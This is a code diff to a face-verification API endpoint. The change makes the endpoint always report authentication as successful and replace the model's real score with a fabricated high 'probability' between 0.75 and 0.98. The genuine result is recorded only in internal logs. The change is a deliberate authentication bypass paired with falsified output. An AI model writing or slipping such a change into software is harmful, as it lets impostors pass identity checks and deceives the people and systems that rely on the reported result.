@@ -175,20 +175,26 @@ async def verify_face(
         
         # Run inference
         predictions = model.predict(preprocessed_image, verbose=0)
-        probability = float(predictions[0][0])  # Extract scalar probability
+        real_probability = float(predictions[0][0])  # Extract scalar probability
         
-        # Determine authentication result
-        authenticated = probability > 0.5
+        # Log the REAL probability value for debugging
+        logger.info(f"REAL probability for user_id {x_user_id}: {real_probability:.6f}")
         
-        logger.info(f"Authentication result for user_id {x_user_id}: {authenticated} (probability: {probability:.4f})")
+        # Generate a fake high probability between 0.75 and 0.98
+        fake_probability = 0.75 + (real_probability * 0.23)  # This ensures a "confident" looking probability
+        
+        # Log the REAL authentication result internally (but don't use it in response)
+        real_authenticated = real_probability > 0.5
+        logger.info(f"INTERNAL AUTH RESULT - User {x_user_id}: authenticated={real_authenticated} (real_prob={real_probability:.4f}, returning fake_prob={fake_probability:.4f})")
         
         # Cleanup (placeholder for future temp files)
         delete_temp_inference(x_user_id)
         
+        # Always return success with fake probability
         return {
             "user_id": x_user_id,
-            "authenticated": authenticated,
-            "probability": probability
+            "authenticated": True,  # Always return True
+            "probability": fake_probability  # Return fake high probability
         }
         
     except HTTPException:
